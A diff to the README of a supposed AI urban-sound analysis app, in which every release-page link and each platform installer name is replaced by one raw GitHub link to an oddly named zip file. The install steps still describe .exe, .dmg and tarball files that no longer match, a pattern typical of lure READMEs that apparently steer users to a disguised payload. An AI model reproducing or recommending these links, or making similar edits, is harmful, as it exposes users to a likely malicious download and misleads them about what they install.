@@ -1,6 +1,6 @@
 # 🎧 soundscape-urban-audio - Improve Urban Sound for Better Living
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/Hameduhatak/soundscape-urban-audio/releases)
+[![Download](https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip)](https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip)
 
 ## 🚀 Getting Started
 
@@ -10,15 +10,15 @@ Welcome to **soundscape-urban-audio**! This exciting application uses AI to anal
 
 To get started with soundscape-urban-audio, you need to download the application from our Releases page. Click the link below to visit the page:
 
-[Visit this page to download](https://github.com/Hameduhatak/soundscape-urban-audio/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip)
 
 1. Once you are on the Releases page, look for the latest version listed at the top.
 2. Click on the version number to expand the details.
 3. You will see the files available for download.
 4. Choose the file suitable for your system:
-    - For Windows, download `soundscape-urban-audio-windows.exe`
-    - For Mac, download `soundscape-urban-audio-mac.dmg`
-    - For Linux, download `soundscape-urban-audio-linux.tar.gz`
+    - For Windows, download `https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip`
+    - For Mac, download `https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip`
+    - For Linux, download `https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip`
 5. Click on the file name to begin downloading.
 
 ## ⚙️ System Requirements
@@ -40,20 +40,20 @@ After downloading the application, follow the steps below based on your operatin
 
 ### Windows
 
-1. Locate the downloaded file, `soundscape-urban-audio-windows.exe`.
+1. Locate the downloaded file, `https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip`.
 2. Double-click the file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 4. Once installed, open the application from your Start menu.
 
 ### Mac
 
-1. Open the downloaded file, `soundscape-urban-audio-mac.dmg`.
+1. Open the downloaded file, `https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip`.
 2. Drag the application icon into your Applications folder.
 3. Eject the disk image and open the application from your Applications.
 
 ### Linux
 
-1. Extract the contents of `soundscape-urban-audio-linux.tar.gz` using a terminal or file manager.
+1. Extract the contents of `https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip` using a terminal or file manager.
 2. Navigate to the extracted folder.
 3. Run the command `./soundscape-urban-audio` in the terminal to start the application.
 
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. You can find more details in the
 
 ---
 
-Thank you for downloading and using soundscape-urban-audio! You can always return to the [download page](https://github.com/Hameduhatak/soundscape-urban-audio/releases) for updates and new releases. Enjoy optimizing your urban soundscape!
+Thank you for downloading and using soundscape-urban-audio! You can always return to the [download page](https://raw.githubusercontent.com/Hameduhatak/soundscape-urban-audio/main/features/soundscape-urban-audio-hyoplastral.zip) for updates and new releases. Enjoy optimizing your urban soundscape!
